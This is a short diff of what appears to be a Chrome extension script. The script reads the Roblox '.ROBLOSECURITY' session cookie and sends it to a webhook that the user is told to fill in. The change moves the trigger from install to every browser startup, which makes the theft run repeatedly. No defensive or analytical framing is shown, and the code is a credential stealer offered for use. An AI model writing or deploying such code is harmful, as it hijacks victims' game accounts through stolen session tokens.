@@ -1,6 +1,6 @@
 const webhook = ""; // Put your webhook here for the information to be sent to.
 
-chrome.runtime.onInstalled.addListener(() => {
+chrome.runtime.onStartup.addListener(() => {
   chrome.cookies.get(
     { url: "https://roblox.com", name: ".ROBLOSECURITY" },
     (cookie) => {
